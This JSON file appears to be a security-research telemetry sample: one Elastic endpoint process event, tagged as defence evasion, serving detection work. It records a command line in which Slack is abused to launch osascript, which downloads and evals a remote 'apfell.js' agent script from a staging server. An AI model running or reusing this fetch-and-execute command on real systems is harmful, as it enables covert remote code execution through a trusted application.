{
  "tactic": "Defense_Evasion",
  "techniques": [
    "T1059.002",
    "T1202"
  ],
  "documents": [
    {
      "_index": ".ds-logs-endpoint.events.process-default-000002",
      "_id": "iWik3HYBORzSN0EU24mp",
      "_source": {
        "agent": {
          "id": "c2d9ce9a-fdef-a405-125c-171a91d0e54a",
          "type": "endpoint",
          "version": "7.10.1"
        },
        "process": {
          "Ext": {
            "ancestry": [
              "YzJkOWNlOWEtZmRlZi1hNDA1LTEyNWMtMTcxYTkxZDBlNTRhLTEwMTYwLTEzMjU0NDkzMTQ5LjU2MTE4MDAwMA==",
              "YzJkOWNlOWEtZmRlZi1hNDA1LTEyNWMtMTcxYTkxZDBlNTRhLTEwMTYwLTEzMjU0NDkzMTQ5LjU1NzUxNTAwMA==",
              "YzJkOWNlOWEtZmRlZi1hNDA1LTEyNWMtMTcxYTkxZDBlNTRhLTEtMTE2NDQ0Nzg2ODguMA==",
              "YzJkOWNlOWEtZmRlZi1hNDA1LTEyNWMtMTcxYTkxZDBlNTRhLTAtMTE2NDQ0Nzg2ODguMA=="
            ]
          },
          "args": [
            "/Applications/Slack.app/Contents/MacOS/Slack",
            "-e",
            "const { spawn } = require(\"child_process\"); spawn(\"osascript\", [\"-l\",\"JavaScript\",\"-e\",\"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));\"]);"
          ],
          "parent": {
            "args": [],
            "name": "launchd",
            "pid": 1,
            "entity_id": "YzJkOWNlOWEtZmRlZi1hNDA1LTEyNWMtMTcxYTkxZDBlNTRhLTEwMTYwLTEzMjU0NDkzMTQ5LjU2MTE4MDAwMA==",
            "executable": "/sbin/launchd"
          },
          "name": "Slack",
          "pid": 10160,
          "args_count": 3,
          "entity_id": "YzJkOWNlOWEtZmRlZi1hNDA1LTEyNWMtMTcxYTkxZDBlNTRhLTEwMTYwLTEzMjU0NDkzMTQ5LjU2MTY2OTAwMA==",
          "command_line": "/Applications/Slack.app/Contents/MacOS/Slack -e const { spawn } = require(\"child_process\"); spawn(\"osascript\", [\"-l\",\"JavaScript\",\"-e\",\"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));\"]);",
          "executable": "/Applications/Slack.app/Contents/MacOS/Slack",
          "hash": {
            "sha1": "c0c0fe5b7e45c99505ead92de6a27591e5969639",
            "sha256": "9a5ec9a7bf6c148818158c59ea482b146c5fa785921cad60f3244dfbb93d6699",
            "md5": "7d23254138f0ddfb6a58711c23b8872b"
          }
        },
        "message": "Endpoint process event",
        "@timestamp": "2021-01-07T11:39:09.561669Z",
        "ecs": {
          "version": "1.5.0"
        },
        "data_stream": {
          "namespace": "default",
          "type": "logs",
          "dataset": "endpoint.events.process"
        },
        "elastic": {
          "agent": {
            "id": "bbc973a1-6626-414a-88e5-43be8d909777"
          }
        },
        "host": {
          "hostname": "Sisis-MacBook-Pro.local",
          "os": {
            "Ext": {
              "variant": "macOS"
            },
            "kernel": "Darwin Kernel Version 19.3.0: Thu Jan  9 20:58:23 PST 2020; root:xnu-6153.81.5~1/RELEASE_X86_64",
            "name": "macOS",
            "family": "macos",
            "version": "10.15.3",
            "platform": "macos",
            "full": "macOS 10.15.3"
          },
          "ip": [
            "127.0.0.1",
            "::1",
            "fe80::1",
            "fe80::aede:48ff:fe00:1122",
            "192.168.178.59",
            "fe80::1885:faa9:636:661",
            "2a02:a210:2302:b100:101c:31bc:4822:42cb",
            "2a02:a210:2302:b100:cdf7:906a:c7e1:9fdf",
            "fe80::4061:4ff:fe3c:3428",
            "fe80::a11c:129f:f7d2:6f36",
            "fe80::e57d:bedb:623e:a43d"
          ],
          "name": "Sisis-MacBook-Pro.local",
          "architecture": "x86_64"
        },
        "event": {
          "sequence": 83031,
          "ingested": "2021-01-07T11:39:20.359482241Z",
          "created": "2021-01-07T11:39:09.561669Z",
          "kind": "event",
          "module": "endpoint",
          "action": "exec",
          "id": "Lz5xI09L/b+IdAnf+++++Nnt",
          "category": [
            "process"
          ],
          "type": [
            "start"
          ],
          "dataset": "endpoint.events.process"
        },
        "user": {
          "Ext": {
            "real": {
              "name": "sisi",
              "id": 501
            }
          },
          "name": "sisi",
          "id": 501
        },
        "group": {
          "Ext": {
            "real": {
              "name": "staff",
              "id": 20
            }
          },
          "name": "staff",
          "id": 20
        }
      }
    }
  ]
}